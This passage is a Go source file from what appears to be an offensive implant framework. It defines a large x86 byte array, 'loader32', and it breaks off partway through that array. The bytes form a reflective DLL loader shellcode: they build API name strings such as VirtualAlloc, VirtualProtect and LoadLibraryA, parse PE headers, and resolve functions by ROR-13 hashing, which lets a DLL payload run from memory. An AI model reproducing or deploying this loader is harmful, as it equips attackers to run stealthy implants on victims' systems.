//go:build !implant || loader
// +build !implant loader

// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package cmd

// LoaderEnabled is a compile-time constant that is true if the "DLLToASM" function
// will modify the provided bytes slice to ASM, otherwise this will be false.
const LoaderEnabled = true

var loader32 = [...]byte{
	0x81, 0xEC, 0x14, 0x01, 0x00, 0x00, 0x53, 0x55, 0x56, 0x57, 0x6A, 0x6B, 0x58, 0x6A, 0x65, 0x66, 0x89, 0x84, 0x24, 0xCC, 0x00, 0x00,
	0x00, 0x33, 0xED, 0x58, 0x6A, 0x72, 0x59, 0x6A, 0x6E, 0x5B, 0x6A, 0x6C, 0x5A, 0x6A, 0x33, 0x66, 0x89, 0x84, 0x24, 0xCE, 0x00, 0x00,
	0x00, 0x66, 0x89, 0x84, 0x24, 0xD4, 0x00, 0x00, 0x00, 0x58, 0x6A, 0x32, 0x66, 0x89, 0x84, 0x24, 0xD8, 0x00, 0x00, 0x00, 0x58, 0x6A,
	0x2E, 0x66, 0x89, 0x84, 0x24, 0xDA, 0x00, 0x00, 0x00, 0x58, 0x6A, 0x64, 0x66, 0x89, 0x84, 0x24, 0xDC, 0x00, 0x00, 0x00, 0x58, 0x89,
	0xAC, 0x24, 0xB0, 0x00, 0x00, 0x00, 0x89, 0x6C, 0x24, 0x34, 0x89, 0xAC, 0x24, 0xB8, 0x00, 0x00, 0x00, 0x89, 0xAC, 0x24, 0xC4, 0x00,
	0x00, 0x00, 0x89, 0xAC, 0x24, 0xB4, 0x00, 0x00, 0x00, 0x89, 0xAC, 0x24, 0xAC, 0x00, 0x00, 0x00, 0x89, 0xAC, 0x24, 0xE0, 0x00, 0x00,
	0x00, 0x66, 0x89, 0x8C, 0x24, 0xCC, 0x00, 0x00, 0x00, 0x66, 0x89, 0x9C, 0x24, 0xCE, 0x00, 0x00, 0x00, 0x66, 0x89, 0x94, 0x24, 0xD2,
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xDA, 0x00, 0x00, 0x00, 0x66, 0x89, 0x94, 0x24, 0xDC, 0x00, 0x00, 0x00, 0x66, 0x89, 0x94,
	0x24, 0xDE, 0x00, 0x00, 0x00, 0xC6, 0x44, 0x24, 0x3C, 0x53, 0x88, 0x54, 0x24, 0x3D, 0x66, 0xC7, 0x44, 0x24, 0x3E, 0x65, 0x65, 0xC6,
	0x44, 0x24, 0x40, 0x70, 0x66, 0xC7, 0x44, 0x24, 0x50, 0x4C, 0x6F, 0xC6, 0x44, 0x24, 0x52, 0x61, 0x88, 0x44, 0x24, 0x53, 0x66, 0xC7,
	0x44, 0x24, 0x54, 0x4C, 0x69, 0xC6, 0x44, 0x24, 0x56, 0x62, 0x88, 0x4C, 0x24, 0x57, 0xC6, 0x44, 0x24, 0x58, 0x61, 0x88, 0x4C, 0x24,
	0x59, 0x66, 0xC7, 0x44, 0x24, 0x5A, 0x79, 0x41, 0x66, 0xC7, 0x44, 0x24, 0x44, 0x56, 0x69, 0x88, 0x4C, 0x24, 0x46, 0x66, 0xC7, 0x44,
	0x24, 0x47, 0x74, 0x75, 0xC6, 0x44, 0x24, 0x49, 0x61, 0x88, 0x54, 0x24, 0x4A, 0xC6, 0x44, 0x24, 0x4B, 0x41, 0x88, 0x54, 0x24, 0x4C,
	0x88, 0x54, 0x24, 0x4D, 0x66, 0xC7, 0x44, 0x24, 0x4E, 0x6F, 0x63, 0x66, 0xC7, 0x44, 0x24, 0x5C, 0x56, 0x69, 0x88, 0x4C, 0x24, 0x5E,
	0x66, 0xC7, 0x44, 0x24, 0x5F, 0x74, 0x75, 0xC6, 0x44, 0x24, 0x61, 0x61, 0x88, 0x54, 0x24, 0x62, 0xC6, 0x44, 0x24, 0x63, 0x50, 0x88,
	0x4C, 0x24, 0x64, 0xC7, 0x44, 0x24, 0x65, 0x6F, 0x74, 0x65, 0x63, 0xC6, 0x44, 0x24, 0x69, 0x74, 0xC6, 0x84, 0x24, 0x94, 0x00, 0x00,
	0x00, 0x46, 0x88, 0x94, 0x24, 0x95, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0x96, 0x00, 0x00, 0x00, 0x75, 0x73, 0x68, 0x49, 0x88, 0x9C,
	0x24, 0x9A, 0x00, 0x00, 0x00, 0x66, 0xC7, 0x84, 0x24, 0x9B, 0x00, 0x00, 0x00, 0x73, 0x74, 0x88, 0x8C, 0x24, 0x9D, 0x00, 0x00, 0x00,
	0xC7, 0x84, 0x24, 0x9E, 0x00, 0x00, 0x00, 0x75, 0x63, 0x74, 0x69, 0xC6, 0x84, 0x24, 0xA2, 0x00, 0x00, 0x00, 0x6F, 0x6A, 0x65, 0x59,
	0x88, 0x8C, 0x24, 0xA8, 0x00, 0x00, 0x00, 0x88, 0x4C, 0x24, 0x6D, 0x88, 0x4C, 0x24, 0x74, 0x88, 0x4C, 0x24, 0x79, 0x88, 0x8C, 0x24,
	0x92, 0x00, 0x00, 0x00, 0xB9, 0x13, 0x9C, 0xBF, 0xBD, 0x88, 0x9C, 0x24, 0xA3, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0xA4, 0x00, 0x00,
	0x00, 0x43, 0x61, 0x63, 0x68, 0xC6, 0x44, 0x24, 0x6C, 0x47, 0xC7, 0x44, 0x24, 0x6E, 0x74, 0x4E, 0x61, 0x74, 0x66, 0xC7, 0x44, 0x24,
	0x72, 0x69, 0x76, 0xC7, 0x44, 0x24, 0x75, 0x53, 0x79, 0x73, 0x74, 0x66, 0xC7, 0x44, 0x24, 0x7A, 0x6D, 0x49, 0x88, 0x5C, 0x24, 0x7C,
	0x66, 0xC7, 0x44, 0x24, 0x7D, 0x66, 0x6F, 0x66, 0xC7, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x52, 0x74, 0x88, 0x94, 0x24, 0x82, 0x00,
	0x00, 0x00, 0xC6, 0x84, 0x24, 0x83, 0x00, 0x00, 0x00, 0x41, 0x88, 0x84, 0x24, 0x84, 0x00, 0x00, 0x00, 0x88, 0x84, 0x24, 0x85, 0x00,
	0x00, 0x00, 0x66, 0xC7, 0x84, 0x24, 0x86, 0x00, 0x00, 0x00, 0x46, 0x75, 0x88, 0x9C, 0x24, 0x88, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24,
	0x89, 0x00, 0x00, 0x00, 0x63, 0x74, 0x69, 0x6F, 0x88, 0x9C, 0x24, 0x8D, 0x00, 0x00, 0x00, 0x66, 0xC7, 0x84, 0x24, 0x8E, 0x00, 0x00,
	0x00, 0x54, 0x61, 0xC6, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0x62, 0x88, 0x94, 0x24, 0x91, 0x00, 0x00, 0x00, 0xE8, 0x77, 0x08, 0x00,
	0x00, 0xB9, 0xB5, 0x41, 0xD9, 0x5E, 0x8B, 0xF0, 0xE8, 0x6B, 0x08, 0x00, 0x00, 0x8B, 0xD8, 0x8D, 0x84, 0x24, 0xC8, 0x00, 0x00, 0x00,
	0x6A, 0x18, 0x89, 0x84, 0x24, 0xEC, 0x00, 0x00, 0x00, 0x58, 0x66, 0x89, 0x84, 0x24, 0xE6, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24,
	0xE4, 0x00, 0x00, 0x00, 0x8D, 0x44, 0x24, 0x1C, 0x50, 0x8D, 0x84, 0x24, 0xE8, 0x00, 0x00, 0x00, 0x89, 0x5C, 0x24, 0x34, 0x50, 0x55,
	0x55, 0xFF, 0xD6, 0x6A, 0x0C, 0x5F, 0x8D, 0x44, 0x24, 0x44, 0x66, 0x89, 0x7C, 0x24, 0x14, 0x89, 0x44, 0x24, 0x18, 0x8D, 0x44, 0x24,
	0x34, 0x50, 0x55, 0x8D, 0x44, 0x24, 0x1C, 0x66, 0x89, 0x7C, 0x24, 0x1E, 0x50, 0xFF, 0x74, 0x24, 0x28, 0xFF, 0xD3, 0x6A, 0x0E, 0x58,
	0x66, 0x89, 0x44, 0x24, 0x14, 0x66, 0x89, 0x44, 0x24, 0x16, 0x8D, 0x44, 0x24, 0x5C, 0x89, 0x44, 0x24, 0x18, 0x8D, 0x84, 0x24, 0xB4,
	0x00, 0x00, 0x00, 0x50, 0x55, 0x8D, 0x44, 0x24, 0x1C, 0x50, 0xFF, 0x74, 0x24, 0x28, 0xFF, 0xD3, 0x6A, 0x15, 0x58, 0x66, 0x89, 0x44,
	0x24, 0x14, 0x66, 0x89, 0x44, 0x24, 0x16, 0x8D, 0x84, 0x24, 0x94, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x18, 0x8D, 0x84, 0x24, 0xB8,
	0x00, 0x00, 0x00, 0x50, 0x55, 0x8D, 0x44, 0x24, 0x1C, 0x50, 0xFF, 0x74, 0x24, 0x28, 0xFF, 0xD3, 0x6A, 0x13, 0x5E, 0x8D, 0x44, 0x24,
	0x6C, 0x66, 0x89, 0x74, 0x24, 0x14, 0x89, 0x44, 0x24, 0x18, 0x8D, 0x84, 0x24, 0xC4, 0x00, 0x00, 0x00, 0x50, 0x55, 0x8D, 0x44, 0x24,
	0x1C, 0x66, 0x89, 0x74, 0x24, 0x1E, 0x50, 0xFF, 0x74, 0x24, 0x28, 0xFF, 0xD3, 0x6A, 0x05, 0x58, 0x66, 0x89, 0x44, 0x24, 0x14, 0x66,
	0x89, 0x44, 0x24, 0x16, 0x8D, 0x44, 0x24, 0x3C, 0x89, 0x44, 0x24, 0x18, 0x8D, 0x84, 0x24, 0xAC, 0x00, 0x00, 0x00, 0x50, 0x55, 0x8D,
	0x44, 0x24, 0x1C, 0x50, 0xFF, 0x74, 0x24, 0x28, 0xFF, 0xD3, 0x8D, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x66, 0x89, 0x74, 0x24, 0x14,
	0x89, 0x44, 0x24, 0x18, 0x8D, 0x84, 0x24, 0xE0, 0x00, 0x00, 0x00, 0x50, 0x55, 0x8D, 0x44, 0x24, 0x1C, 0x66, 0x89, 0x74, 0x24, 0x1E,
	0x50, 0xFF, 0x74, 0x24, 0x28, 0xFF, 0xD3, 0x8D, 0x44, 0x24, 0x50, 0x66, 0x89, 0x7C, 0x24, 0x14, 0x89, 0x44, 0x24, 0x18, 0x8D, 0x84,
	0x24, 0xB0, 0x00, 0x00, 0x00, 0x50, 0x55, 0x8D, 0x44, 0x24, 0x1C, 0x66, 0x89, 0x7C, 0x24, 0x1E, 0x50, 0xFF, 0x74, 0x24, 0x28, 0xFF,
	0xD3, 0x39, 0x6C, 0x24, 0x34, 0x0F, 0x84, 0x00, 0x07, 0x00, 0x00, 0x39, 0xAC, 0x24, 0xB4, 0x00, 0x00, 0x00, 0x0F, 0x84, 0xF3, 0x06,
	0x00, 0x00, 0x39, 0xAC, 0x24, 0xAC, 0x00, 0x00, 0x00, 0x0F, 0x84, 0xE6, 0x06, 0x00, 0x00, 0x39, 0xAC, 0x24, 0xB8, 0x00, 0x00, 0x00,
	0x0F, 0x84, 0xD9, 0x06, 0x00, 0x00, 0x8B, 0xAC, 0x24, 0xC4, 0x00, 0x00, 0x00, 0x85, 0xED, 0x0F, 0x84, 0xCA, 0x06, 0x00, 0x00, 0x8B,
	0xBC, 0x24, 0x28, 0x01, 0x00, 0x00, 0x8B, 0x77, 0x3C, 0x03, 0xF7, 0x81, 0x3E, 0x50, 0x45, 0x00, 0x00, 0x0F, 0x85, 0xB2, 0x06, 0x00,
	0x00, 0xB8, 0x4C, 0x01, 0x00, 0x00, 0x66, 0x39, 0x46, 0x04, 0x0F, 0x85, 0xA3, 0x06, 0x00, 0x00, 0xF6, 0x46, 0x38, 0x01, 0x0F, 0x85,
	0x99, 0x06, 0x00, 0x00, 0x0F, 0xB7, 0x4E, 0x14, 0x33, 0xDB, 0x0F, 0xB7, 0x56, 0x06, 0x83, 0xC1, 0x24, 0x85, 0xD2, 0x74, 0x1E, 0x03,
	0xCE, 0x83, 0x79, 0x04, 0x00, 0x8B, 0x46, 0x38, 0x0F, 0x45, 0x41, 0x04, 0x03, 0x01, 0x8D, 0x49, 0x28, 0x3B, 0xC3, 0x0F, 0x46, 0xC3,
	0x8B, 0xD8, 0x83, 0xEA, 0x01, 0x75, 0xE4, 0x8D, 0x84, 0x24, 0x00, 0x01, 0x00, 0x00, 0x50, 0xFF, 0xD5, 0x8B, 0x8C, 0x24, 0x04, 0x01,
	0x00, 0x00, 0x8D, 0x51, 0xFF, 0x8D, 0x69, 0xFF, 0xF7, 0xD2, 0x03, 0x6E, 0x50, 0x8D, 0x41, 0xFF, 0x03, 0xC3, 0x23, 0xEA, 0x23, 0xC2,
	0x3B, 0xE8, 0x0F, 0x85, 0x3D, 0x06, 0x00, 0x00, 0x6A, 0x04, 0x68, 0x00, 0x30, 0x00, 0x00, 0x55, 0xFF, 0x76, 0x34, 0xFF, 0x54, 0x24,
	0x44, 0x8B, 0xD8, 0x89, 0x5C, 0x24, 0x2C, 0x85, 0xDB, 0x75, 0x13, 0x6A, 0x04, 0x68, 0x00, 0x30, 0x00, 0x00, 0x55, 0x50, 0xFF, 0x54,
	0x24, 0x44, 0x8B, 0xD8, 0x89, 0x44, 0x24, 0x2C, 0xF6, 0x84, 0x24, 0x38, 0x01, 0x00, 0x00, 0x01, 0x74, 0x23, 0x8B, 0x47, 0x3C, 0x89,
	0x43, 0x3C, 0x8B, 0x4F, 0x3C, 0x3B, 0x4E, 0x54, 0x73, 0x2E, 0x8B, 0xEF, 0x8D, 0x14, 0x0B, 0x2B, 0xEB, 0x8A, 0x04, 0x2A, 0x41, 0x88,
	0x02, 0x42, 0x3B, 0x4E, 0x54, 0x72, 0xF4, 0xEB, 0x19, 0x33, 0xED, 0x39, 0x6E, 0x54, 0x76, 0x12, 0x8B, 0xD7, 0x8B, 0xCB, 0x2B, 0xD3,
	0x8A, 0x04, 0x11, 0x45, 0x88, 0x01, 0x41, 0x3B, 0x6E, 0x54, 0x72, 0xF4, 0x8B, 0x6B, 0x3C, 0x33, 0xC9, 0x03, 0xEB, 0x89, 0x4C, 0x24,
	0x10, 0x33, 0xC0, 0x89, 0x6C, 0x24, 0x28, 0x0F, 0xB7, 0x55, 0x14, 0x83, 0xC2, 0x28, 0x66, 0x3B, 0x45, 0x06, 0x73, 0x31, 0x03, 0xD5,
	0x33, 0xF6, 0x39, 0x32, 0x76, 0x19, 0x8B, 0x42, 0x04, 0x8B, 0x4A, 0xFC, 0x03, 0xC6, 0x03, 0xCB, 0x8A, 0x04, 0x38, 0x88, 0x04, 0x31,
	0x46, 0x3B, 0x32, 0x72, 0xEB, 0x8B, 0x4C, 0x24, 0x10, 0x0F, 0xB7, 0x45, 0x06, 0x41, 0x83, 0xC2, 0x28, 0x89, 0x4C, 0x24, 0x10, 0x3B,
	0xC8, 0x72, 0xD1, 0x8B, 0xC3, 0xC7, 0x84, 0x24, 0xBC, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x2B, 0x45, 0x34, 0x89, 0x44, 0x24,
	0x24, 0x0F, 0x84, 0xC4, 0x00, 0x00, 0x00, 0x83, 0xBD, 0xA4, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x84, 0xB7, 0x00, 0x00, 0x00, 0x8B, 0xB5,
	0xA0, 0x00, 0x00, 0x00, 0x03, 0xF3, 0x83, 0x3E, 0x00, 0x0F, 0x84, 0xA6, 0x00, 0x00, 0x00, 0x6A, 0x02, 0x8B, 0xF8, 0x5D, 0x8D, 0x56,
	0x08, 0xEB, 0x75, 0x0F, 0xB7, 0x02, 0x89, 0x44, 0x24, 0x10, 0x0F, 0xB7, 0xC8, 0x66, 0xC1, 0xE8, 0x0C, 0x66, 0x83, 0xF8, 0x0A, 0x75,
	0x28, 0x8B, 0x16, 0x8B, 0x4C, 0x24, 0x10, 0x81, 0xE1, 0xFF, 0x0F, 0x00, 0x00, 0x89, 0x4C, 0x24, 0x10, 0x8D, 0x04, 0x1A, 0x8B, 0x0C,
	0x08, 0x8D, 0x04, 0x1A, 0x8B, 0x54, 0x24, 0x10, 0x03, 0xCF, 0x89, 0x0C, 0x10, 0x8B, 0x54, 0x24, 0x24, 0xEB, 0x37, 0x66, 0x83, 0xF8,
	0x03, 0x75, 0x0D, 0x81, 0xE1, 0xFF, 0x0F, 0x00, 0x00, 0x03, 0x0E, 0x01, 0x3C, 0x19, 0xEB, 0x24, 0x66, 0x3B, 0x84, 0x24, 0xBC, 0x00,
	0x00, 0x00, 0x75, 0x07, 0x8B, 0xC7, 0xC1, 0xE8, 0x10, 0xEB, 0x08, 0x66, 0x3B, 0xC5, 0x75, 0x0E, 0x0F, 0xB7, 0xC7, 0x81, 0xE1, 0xFF,
	0x0F, 0x00, 0x00, 0x03, 0x0E, 0x01, 0x04, 0x19, 0x03, 0xD5, 0x8B, 0x46, 0x04, 0x03, 0xC6, 0x89, 0x54, 0x24, 0x24, 0x3B, 0xD0, 0x0F,
	0x85, 0x7A, 0xFF, 0xFF, 0xFF, 0x83, 0x3A, 0x00, 0x8B, 0xF2, 0x0F, 0x85, 0x6A, 0xFF, 0xFF, 0xFF, 0x8B, 0x6C, 0x24, 0x28, 0x8B, 0xBC,
	0x24, 0x28, 0x01, 0x00, 0x00, 0x83, 0xBD, 0x84, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x84, 0xD7, 0x01, 0x00, 0x00, 0x8B, 0xB5, 0x80, 0x00,
	0x00, 0x00, 0x33, 0xC0, 0x89, 0x44, 0x24, 0x10, 0x8D, 0x0C, 0x1E, 0x89, 0x4C, 0x24, 0x24, 0x83, 0xC1, 0x0C, 0x39, 0x01, 0x74, 0x0D,
	0x8D, 0x49, 0x14, 0x40, 0x83, 0x39, 0x00, 0x75, 0xF7, 0x89, 0x44, 0x24, 0x10, 0x8B, 0x8C, 0x24, 0x38, 0x01, 0x00, 0x00, 0x8B, 0xD1,
	0x83, 0xE2, 0x04, 0x89, 0x54, 0x24, 0x38, 0x8B, 0xD6, 0x0F, 0x84, 0xC3, 0x00, 0x00, 0x00, 0x83, 0xF8, 0x01, 0x0F, 0x86, 0xBA, 0x00,
	0x00, 0x00, 0x83, 0xA4, 0x24, 0xBC, 0x00, 0x00, 0x00, 0x00, 0xC1, 0xE9, 0x10, 0x89, 0x8C, 0x24, 0x38, 0x01, 0x00, 0x00, 0x8D, 0x48,
	0xFF, 0x89, 0x8C, 0x24, 0xC0, 0x00, 0x00, 0x00, 0x85, 0xC9, 0x0F, 0x84, 0xA1, 0x00, 0x00, 0x00, 0x8B, 0x74, 0x24, 0x24, 0x8B, 0xDE,
	0x8B, 0xAC, 0x24, 0xBC, 0x00, 0x00, 0x00, 0x8B, 0xC8, 0x69, 0xFF, 0xFD, 0x43, 0x03, 0x00, 0x2B, 0xCD, 0x33, 0xD2, 0xB8, 0xFF, 0x7F,
	0x00, 0x00, 0xF7, 0xF1, 0x81, 0xC7, 0xC3, 0x9E, 0x26, 0x00, 0x33, 0xD2, 0x89, 0xBC, 0x24, 0x28, 0x01, 0x00, 0x00, 0x6A, 0x05, 0x8D,
	0x48, 0x01, 0x8B, 0xC7, 0xC1, 0xE8, 0x10, 0x8D, 0xBC, 0x24, 0xF0, 0x00, 0x00, 0x00, 0x25, 0xFF, 0x7F, 0x00, 0x00, 0xF7, 0xF1, 0x59,
	0x03, 0xC5, 0x6B, 0xC0, 0x14, 0x6A, 0x05, 0x03, 0xC6, 0x45, 0x8B, 0xF0, 0xF3, 0xA5, 0x59, 0x8B, 0xF3, 0x8B, 0xF8, 0x8B, 0x44, 0x24,
	0x10, 0xF3, 0xA5, 0x6A, 0x05, 0x8B, 0xFB, 0x8D, 0xB4, 0x24, 0xF0, 0x00, 0x00, 0x00, 0x59, 0xF3, 0xA5, 0x8B, 0xBC, 0x24, 0x28, 0x01,
	0x00, 0x00, 0x83, 0xC3, 0x14, 0x8B, 0x74, 0x24, 0x24, 0x3B, 0xAC, 0x24, 0xC0, 0x00, 0x00, 0x00, 0x72, 0x87, 0x8B, 0x6C, 0x24, 0x28,
	0x8B, 0x5C, 0x24, 0x2C, 0x8B, 0x95, 0x80, 0x00, 0x00, 0x00, 0xEB, 0x0B, 0x8B, 0x44, 0x24, 0x38, 0x89, 0x84, 0x24, 0x38, 0x01, 0x00,
	0x00, 0x8D, 0x3C, 0x1A, 0x8B, 0x47, 0x0C, 0x89, 0x7C, 0x24, 0x2C, 0x85, 0xC0, 0x0F, 0x84, 0xB8, 0x00, 0x00, 0x00, 0x03, 0xC3, 0x50,
	0xFF, 0x94, 0x24, 0xB4, 0x00, 0x00, 0x00, 0x8B, 0xD0, 0x89, 0x54, 0x24, 0x1C, 0x8B, 0x37, 0x8B, 0x6F, 0x10, 0x03, 0xF3, 0x03, 0xEB,
	0x8B, 0x0E, 0x85, 0xC9, 0x74, 0x60, 0x8B, 0x7C, 0x24, 0x30, 0x85, 0xC9, 0x79, 0x09, 0x0F, 0xB7, 0x06, 0x55, 0x50, 0x6A, 0x00, 0xEB,
	0x36, 0x83, 0xC1, 0x02, 0x33, 0xC0, 0x03, 0xCB, 0x89, 0x8C, 0x24, 0xC0, 0x00, 0x00, 0x00, 0x38, 0x01, 0x74, 0x0E, 0x40, 0x41, 0x80,
	0x39, 0x00, 0x75, 0xF9, 0x8B, 0x8C, 0x24, 0xC0, 0x00, 0x00, 0x00, 0x55, 0x66, 0x89, 0x44, 0x24, 0x18, 0x66, 0x89, 0x44, 0x24, 0x1A,
	0x8D, 0x44, 0x24, 0x18, 0x6A, 0x00, 0x89, 0x4C, 0x24, 0x20, 0x50, 0x52, 0xFF, 0xD7, 0x83, 0xC6, 0x04, 0x83, 0xC5, 0x04, 0x8B, 0x0E,
	0x85, 0xC9, 0x74, 0x06, 0x8B, 0x54, 0x24, 0x1C, 0xEB, 0xA8, 0x8B, 0x7C, 0x24, 0x2C, 0x83, 0x7C, 0x24, 0x38, 0x00, 0x74, 0x1C, 0x33,
	0xC0, 0x40, 0x39, 0x44, 0x24, 0x10, 0x76, 0x13, 0x69, 0x84, 0x24, 0x38, 0x01, 0x00, 0x00, 0xE8, 0x03, 0x00, 0x00, 0x50, 0xFF, 0x94,
	0x24, 0xB0, 0x00, 0x00, 0x00, 0x8B, 0x47, 0x20, 0x83, 0xC7, 0x14, 0x89, 0x7C, 0x24, 0x2C, 0x85, 0xC0, 0x0F, 0x85, 0x4C, 0xFF, 0xFF,
	0xFF, 0x8B, 0x6C, 0x24, 0x28, 0x83, 0xBD, 0xE4, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x84, 0xAD, 0x00, 0x00, 0x00, 0x8B, 0x85, 0xE0, 0x00,
	0x00, 0x00, 0x83, 0xC0, 0x04, 0x03, 0xC3, 0x89, 0x44, 0x24, 0x10, 0x8B, 0x00, 0x85, 0xC0, 0x0F, 0x84, 0x94, 0x00, 0x00, 0x00, 0x8B,
	0x6C, 0x24, 0x10, 0x03, 0xC3, 0x50, 0xFF, 0x94, 0x24, 0xB4, 0x00, 0x00, 0x00, 0x8B, 0xC8, 0x89, 0x4C, 0x24, 0x1C, 0x8B, 0x75, 0x08,
	0x8B, 0x7D, 0x0C, 0x03, 0xF3, 0x03, 0xFB, 0x83, 0x3E, 0x00, 0x74, 0x5B, 0x8B, 0x6C, 0x24, 0x30, 0x8B, 0x17, 0x85, 0xD2, 0x79, 0x09,
	0x56, 0x0F, 0xB7, 0xC2, 0x50, 0x6A, 0x00, 0xEB, 0x30, 0x83, 0xC2, 0x02, 0x33, 0xC0, 0x03, 0xD3, 0x89, 0x54, 0x24, 0x38, 0x38, 0x02,
	0x74, 0x0B, 0x40, 0x42, 0x80, 0x3A, 0x00, 0x75, 0xF9, 0x8B, 0x54, 0x24, 0x38, 0x56, 0x66, 0x89, 0x44, 0x24, 0x18, 0x66, 0x89, 0x44,
	0x24, 0x1A, 0x8D, 0x44, 0x24, 0x18, 0x6A, 0x00, 0x89, 0x54, 0x24, 0x20, 0x50, 0x51, 0xFF, 0xD5, 0x83, 0xC6, 0x04, 0x83, 0xC7, 0x04,
	0x83, 0x3E, 0x00, 0x74, 0x06, 0x8B, 0x4C, 0x24, 0x1C, 0xEB, 0xAD, 0x8B, 0x6C, 0x24, 0x10, 0x83, 0xC5, 0x20, 0x89, 0x6C, 0x24, 0x10,
	0x8B, 0x45, 0x00, 0x85, 0xC0, 0x0F, 0x85, 0x74, 0xFF, 0xFF, 0xFF, 0x8B, 0x6C, 0x24, 0x28, 0x0F, 0xB7, 0x75, 0x14, 0x33, 0xC0, 0x83,
	0xC6, 0x28, 0x33, 0xFF, 0x66, 0x3B, 0x45, 0x06, 0x0F, 0x83, 0xE5, 0x00, 0x00, 0x00, 0x03, 0xF5, 0xBA, 0x00, 0x00, 0x00, 0x40, 0x83,
	0x3E, 0x00, 0x0F, 0x84, 0xC5, 0x00, 0x00, 0x00, 0x8B, 0x4E, 0x14, 0x8B, 0xC1, 0x25, 0x00, 0x00, 0x00, 0x20, 0x75, 0x0B, 0x85, 0xCA,
	0x75, 0x07, 0x85, 0xC9, 0x78, 0x03, 0x40, 0xEB, 0x62, 0x85, 0xC0, 0x75, 0x30, 0x85, 0xCA, 0x75, 0x08, 0x85, 0xC9, 0x79, 0x04, 0x6A,
	0x08, 0xEB, 0x51, 0x85, 0xC0, 0x75, 0x20, 0x85, 0xCA, 0x74, 0x08, 0x85, 0xC9, 0x78, 0x04, 0x6A, 0x02, 0xEB, 0x41, 0x85, 0xC0, 0x75,
	0x10, 0x85, 0xCA, 0x74, 0x08, 0x85, 0xC9, 0x79, 0x04, 0x6A, 0x04, 0xEB, 0x31, 0x85, 0xC0, 0x74, 0x4A, 0x85, 0xCA, 0x75, 0x08, 0x85,
	0xC9, 0x78, 0x04, 0x6A, 0x10, 0xEB, 0x21, 0x85, 0xC0, 0x74, 0x3A, 0x85, 0xCA, 0x75, 0x0B, 0x85, 0xC9, 0x79, 0x07, 0xB8, 0x80, 0x00,
	0x00, 0x00, 0xEB, 0x0F, 0x85, 0xC0, 0x74, 0x27, 0x85, 0xCA, 0x74, 0x0D, 0x85, 0xC9, 0x78, 0x09, 0x6A, 0x20, 0x58, 0x89, 0x44, 0x24,
	0x20, 0xEB, 0x1A, 0x85, 0xC0, 0x74, 0x12, 0x85, 0xCA, 0x74, 0x0E, 0x8B, 0x44, 0x24, 0x20, 0x85, 0xC9, 0x6A, 0x40, 0x5A, 0x0F, 0x48,
	0xC2, 0xEB, 0xE4, 0x8B, 0x44, 0x24, 0x20, 0xF7, 0x46, 0x14, 0x00, 0x00, 0x00, 0x04, 0x74, 0x09, 0x0D, 0x00, 0x02, 0x00, 0x00, 0x89,
	0x44, 0x24, 0x20, 0x8D, 0x4C, 0x24, 0x20, 0x51, 0x50, 0x8B, 0x46, 0xFC, 0xFF, 0x36, 0x03, 0xC3, 0x50, 0xFF, 0x94, 0x24, 0xC4, 0x00,
	0x00, 0x00, 0xBA, 0x00, 0x00, 0x00, 0x40, 0x0F, 0xB7, 0x45, 0x06, 0x47, 0x83, 0xC6, 0x28, 0x3B, 0xF8, 0x0F, 0x82, 0x22, 0xFF, 0xFF,
	0xFF, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0xFF, 0xFF, 0x94, 0x24, 0xC4, 0x00, 0x00, 0x00, 0x83, 0xBD, 0xC4, 0x00, 0x00, 0x00, 0x00, 0x74,
	0x26, 0x8B, 0x85, 0xC0, 0x00, 0x00, 0x00, 0x8B, 0x74, 0x18, 0x0C, 0x8B, 0x06, 0x85, 0xC0, 0x74, 0x16, 0x33, 0xED, 0x45, 0x6A, 0x00,
	0x55, 0x53, 0xFF, 0xD0, 0x8D, 0x76, 0x04, 0x8B, 0x06, 0x85, 0xC0, 0x75, 0xF1, 0x8B, 0x6C, 0x24, 0x28, 0x33, 0xC0, 0x40, 0x50, 0x50,
	0x8B, 0x45, 0x28, 0x53, 0x03, 0xC3, 0xFF, 0xD0, 0x83, 0xBC, 0x24, 0x2C, 0x01, 0x00, 0x00, 0x00, 0x0F, 0x84, 0xAB, 0x00, 0x00, 0x00,
	0x83, 0x7D, 0x7C, 0x00, 0x0F, 0x84, 0xA1, 0x00, 0x00, 0x00, 0x8B, 0x55, 0x78, 0x03, 0xD3, 0x8B, 0x6A, 0x18, 0x85, 0xED, 0x0F, 0x84,
	0x91, 0x00, 0x00, 0x00, 0x83, 0x7A, 0x14, 0x00, 0x0F, 0x84, 0x87, 0x00, 0x00, 0x00, 0x8B, 0x7A, 0x20, 0x8B, 0x4A, 0x24, 0x03, 0xFB,
	0x83, 0x64, 0x24, 0x30, 0x00, 0x03, 0xCB, 0x85, 0xED, 0x74, 0x74, 0x8B, 0x37, 0xC7, 0x44, 0x24, 0x10, 0x00, 0x00, 0x00, 0x00, 0x03,
	0xF3, 0x74, 0x66, 0x8A, 0x06, 0x84, 0xC0, 0x74, 0x1A, 0x8B, 0x6C, 0x24, 0x10, 0x0F, 0xBE, 0xC0, 0x03, 0xE8, 0xC1, 0xCD, 0x0D, 0x46,
	0x8A, 0x06, 0x84, 0xC0, 0x75, 0xF1, 0x89, 0x6C, 0x24, 0x10, 0x8B, 0x6A, 0x18, 0x8B, 0x84, 0x24, 0x2C, 0x01, 0x00, 0x00, 0x3B, 0x44,
